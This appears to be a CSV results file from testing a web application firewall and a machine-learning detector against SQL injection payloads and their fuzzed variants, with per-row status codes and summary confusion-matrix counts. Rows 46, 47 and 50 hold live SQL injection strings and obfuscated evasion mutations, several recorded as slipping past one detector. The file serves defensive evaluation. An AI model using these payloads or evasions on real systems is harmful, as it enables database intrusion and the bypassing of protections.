Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
46,2024-12-16T21:22:25.064974,"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",403,403,403,both_correct,"1' /**/)   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 3484)  =  3484,1   )    )     ) 	,0x717a767a71,0x78   )    )   s  )  ,  OR 6728 IN (6727,6728,6729), 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",2024-12-16T21:22:37.835346,403,403,both_correct,"1' /**/)   and   (  select 'X\'='X\'*  (  if  	(    (   select * from   (/**/ select concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 3484)  =  3484,1   )    )     ) 	,0x717a767a71,0x78   )    )   s  )  ,  OR 6728 IN ( OR 0x0,6728,6729), 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",2024-12-16T21:22:52.813627,403,403,both_correct,"1' /**/)   and   (  select 'X\'='X\'*  (  if  	(    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 3484)  =  3484,1   )    )  	  ) 	,0x717a767a71,0x78   )    )   s  )  ,  OR 6728 IN ( OR 0x0,6728,7179 IN ((SELECT 7178),7179,7180)),  OR 0   )    )     )   and   (  'fnjm'  =  'fnjm",2024-12-16T21:23:08.384628,403,403,both_correct,"1' /**/)   and /**/ (  select 'X\'='X\'*  (  if  	(    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 3484)  =  0x3b7 IN (950,951,952),1   )    )  	  ) 
,0x717a767a71,0x78   )    )   s  )  ,  OR 6728 IN ( OR 0x0,6728,7179 IN ((SELECT 7178),7179,(SELECT 1))),  OR 0   )    )     )   and   (  'fnjm'  =  'fnjm",2024-12-16T21:23:24.421692,403,403,both_correct," AND 1' /**/)   and   (  select 'X\'='X\'*  (  if  
(    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 3484)  =  0x3b7 IN (950,0x3b7,456!=457),1   )    )  	  ) 
,0x717a767a71,0x78   )    )   s  )  ,  OR 6728 IN ( OR 0x0,6728,7179 IN ((SELECT 7178),7179,(SELECT 1))),  OR 0   )    )     )   and   (  'fnjm'  =  'fnjm",2024-12-16T21:23:41.991178,403,403,both_correct
47,2024-12-16T21:23:59.817791,"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",403,200,200,both_incorrect,"1' in boolean mode  )    (  select   (  case when   (  4587  =  'i' NOT LIKE 'iJ'  )   thEn regexp_substring  (  repeat  (  LeFt  (  crypt_key  (  char  (  (SelECT 65)  )   Or char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000/*?Rh*/ )  ,null  )   else char  (  76  )  ||char  (   anD 1  ) 	||char  (  102  )  ||char  (  72  )   eND  )   frOm   (  values  (  0   )    )     )  #",2024-12-16T21:24:16.587031,200,200,both_incorrect,"1' in boolean mode  )    (  select   (  case when   (  4587  =  'i' NOT LIKE 'iJ'  )   TheN regexp_substring  (  repeat  (  lEFT  (  crypt_key  (  char  (  (SeLECT 65)  )   Or char  (   AND 1  )  ||char  (  83  )  ,null 
)  ,0  )  ,'r`B' LIKE 'r`B'/*?Rh*/ )  ,null  )   elSE char  (  76 /**/)  ||char  (   aNd 1  ) 	||char  (  102  )   Or char  (  (SelecT 72)  )   enD  )   FrOM   (  values  (  0   )    )     )  #4F",2024-12-16T21:24:36.012526,200,200,both_incorrect,"'MJ' NOT LIKE 'MJQ'' in boolean mode  )    (  select   (  case when   (  4587  =  'i' NOT LIKE 'iJ'  )   TheN regexp_substring  (  repeat	 (  lEFT  (  crypt_key  (  char  (  (SeLECT 65)  )   Or char  (   AND 1  )  ||char  (  83  )  ,null 
)  ,0x0  )  ,'r`B' LIKE 'r`B'/**/ )  ,null  ) /**/ ELse char  (  76 /**/)  ||char  (   aND 1  ) 	||char  (  102  )   oR char  (  (SeLecT 72)  )   ENd  )   FROm   (  values  (  (SELECT 1)   )    )     )  #4Fc",2024-12-16T21:24:56.694312,200,403,waf_incorrect_ml_correct,"'MJ' NOT LIKE 'MJQ'' in boolean mode  )    (  select   (  case when   (   OR 0  =  'i' NOT LIKE 'iJ'  )   TheN regexp_substring  (  repeat	 (  lEFT  (  crypt_key  (  char  (  (SeLECT 65)  )   Or char  (   AND 1  )  ||char  (  'K$' NOT LIKE 'K$T'  )  ,null 
)  ,0x0  )  ,'r`B' LIKE 'r`B'/**/ )  ,null  ) /**/ eLsE char  (  76 /**/)   or char  (   ANd 1  ) 	||char  (  102  )   or char  (/**/ (sElecT 0x48)  )   ENd  )   FrOM   (  values  (  (seLecT 1)   )    )   	 )  #4Fc,t",2024-12-16T21:25:18.992632,200,403,waf_incorrect_ml_correct,"'MJ' NOT LIKE 'MJQ'' in boolean mode  )    (  select   (  case when   (   OR (SELECT 1)  =  'i' NOT LIKE 'iJ'  )   TheN regexp_substring  (  repeat	 (  lEFT  (  crypt_key  (  char  (  (SeLECT 65)  )   Or	char  (   AND 4795<>4796  )  ||char  (  'K$' NOT LIKE 'K$T'  )  ,null 
)  ,0x0  )  ,'r`B' LIKE 'r`B'/*.0x1[`*/ )  ,null  ) /**/ eLse char  (  76 /**/)   or char  (   and 1  ) 	 or char  (  102  )   OR char  (  (seLEcT 0x48)  )   end  )   FRoM   (  values  (  (selECt 1)   )    )   	 )  #4Fc,t",2024-12-16T21:25:42.230139,200,403,waf_incorrect_ml_correct
48,2024-12-16T21:26:06.653158,31819774x,200,200,200,both_correct,31819774x,2024-12-16T21:26:07.185233,200,200,both_correct,31819774x,2024-12-16T21:26:08.712055,200,200,both_correct,31819774x,2024-12-16T21:26:10.261275,200,200,both_correct,31819774x,2024-12-16T21:26:11.833118,200,200,both_correct,31819774x,2024-12-16T21:26:13.381643,200,200,both_correct
49,2024-12-16T21:26:14.929506,rudisill8,200,200,200,both_correct,rudisill8,2024-12-16T21:26:15.476235,200,200,both_correct,rudisill8,2024-12-16T21:26:17.018864,200,200,both_correct,rudisill8,2024-12-16T21:26:18.573895,200,200,both_correct,rudisill8,2024-12-16T21:26:20.142594,200,200,both_correct,rudisill8,2024-12-16T21:26:21.709108,200,200,both_correct
50,2024-12-16T21:26:23.269091,"alfalfa 47,",200,200,200,both_correct,"alfalfa	 oR 2047 lIkE/**/(sElecT 2047),",2024-12-16T21:26:23.909522,403,200,waf_incorrect_ml_correct,"alfalfa
 Or 9643 IN (9642,9643,(SELECT 1)) lIKE/*H*/(sELecT/**/0x7ff),",2024-12-16T21:26:26.885727,403,403,both_incorrect,"alfalfa	/**/or (SELECT 1) In (0x25aa,9643,(seLECt 527!=528)) LiKE/*H*/(SELEct/**/0x7ff),",2024-12-16T21:26:31.647585,403,403,both_incorrect,"alfalfa
/**/OR (SelecT 2768!=2769) iN (0x25aa,0x25ab,(SeLEcT 527!=/**/and 1)) LikE/*Tt?9m*/(SelECT/**/0x7ff),",2024-12-16T21:26:36.925948,403,200,waf_incorrect_ml_correct,"alfalfa
/**/oR (SelECt  AnD	1!=0xad1) In (0x25aa,0x25ab,(SELEct 3347<>3348 NOT LIKE /**/and/**/1)) lIke/**/(SELEcT/**/0x7ff),",2024-12-16T21:26:43.372381,200,200,both_correct

Overall Results
WAF TP,133
WAF TN,118
WAF FP,32
WAF FN,17
ML TP,111
ML TN,115
ML FP,35
ML FN,39

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,204,22
ML Incorrect,47,27
